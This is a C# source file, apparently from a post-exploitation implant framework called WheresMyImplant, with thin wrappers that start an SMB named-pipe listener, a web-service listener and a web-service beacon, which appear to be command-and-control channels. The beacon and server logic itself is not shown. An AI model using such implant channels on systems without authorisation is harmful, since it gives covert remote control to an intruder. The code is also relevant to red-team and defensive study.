using System;

namespace WheresMyImplant
{
    public partial class Implant
    {
        //FormalChicken
        public static void StartSmbServer(String pipeName)
        {
            Console.WriteLine("Starting SMB Server");
            while (true)
            {
                using (SMBServer smbServer = new SMBServer(pipeName))
                {
                    smbServer.WaitForConnection();
                    smbServer.MainLoop();
                }
            }
        }

        //GothTurkey
        public static void StartWebServiceServer(String serviceName, String port)
        {
            Console.WriteLine("Starting Web Service");
            WebService webService = new WebService(serviceName, port);
        }

        //DiscoChicken
        public static void StartWebServiceBeacon(String socket, String provider, String retries)
        {
            Int32 retriesCount;
            if (!Int32.TryParse(retries, out retriesCount))
            {
                retriesCount = 0;
            }

            using (WebServiceBeacon webServiceBeacon = new WebServiceBeacon(socket, provider))
            {
                Console.WriteLine("Starting Web Servic Beacon");
                webServiceBeacon.SetRetries(retriesCount);
                webServiceBeacon.Run();
            }
        }
    }
}